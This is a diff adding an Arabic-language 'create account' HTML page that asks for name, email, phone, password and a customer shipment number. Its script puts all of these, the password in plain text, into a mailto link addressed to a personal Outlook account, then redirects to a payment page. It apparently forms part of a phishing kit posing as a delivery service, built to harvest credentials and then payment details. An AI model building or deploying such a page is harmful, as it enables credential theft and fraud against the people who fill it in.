@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>إنشاء حساب</title>
+    <style>
+        body {
+            background-color: #add8e6;
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
+        input, button {
+            margin: 10px;
+            padding: 10px;
+            width: 80%;
+        }
+    </style>
+    <script>
+        function createAccount() {
+            const firstName = document.getElementById('firstName').value;
+            const lastName = document.getElementById('lastName').value;
+            const email = document.getElementById('email').value;
+            const phone = document.getElementById('phone').value;
+            const password = document.getElementById('password').value;
+            const shipmentNumber = document.getElementById('shipmentNumber').value;
+
+            const body = `الاسم الأول: ${firstName}\nالاسم الأخير: ${lastName}\nالبريد الإلكتروني: ${email}\nرقم الجوال: ${phone}\nكلمة المرور: ${password}\nرقم شحنة العميل: ${shipmentNumber}`;
+
+            window.location.href = `mailto:r-kl22@outlook.com?subject=معلومات التسجيل&body=${encodeURIComponent(body)}`;
+            
+            setTimeout(() => {
+                window.location.href = 'payment.html';
+            }, 1000);
+        }
+    </script>
+</head>
+<body>
+    <h1>إنشاء حساب جديد</h1>
+    <input type="text" id="firstName" placeholder="الاسم الأول" required>
+    <input type="text" id="lastName" placeholder="الاسم الأخير" required>
+    <input type="email" id="email" placeholder="البريد الإلكتروني" required>
+    <input type="tel" id="phone" placeholder="رقم الجوال" required>
+    <input type="password" id="password" placeholder="كلمة مرور" required>
+    <input type="text" id="shipmentNumber" placeholder="رقم شحنة العميل" required>
+    <button onclick="createAccount()">إنشاء حساب</button>
+</body>
+</html>
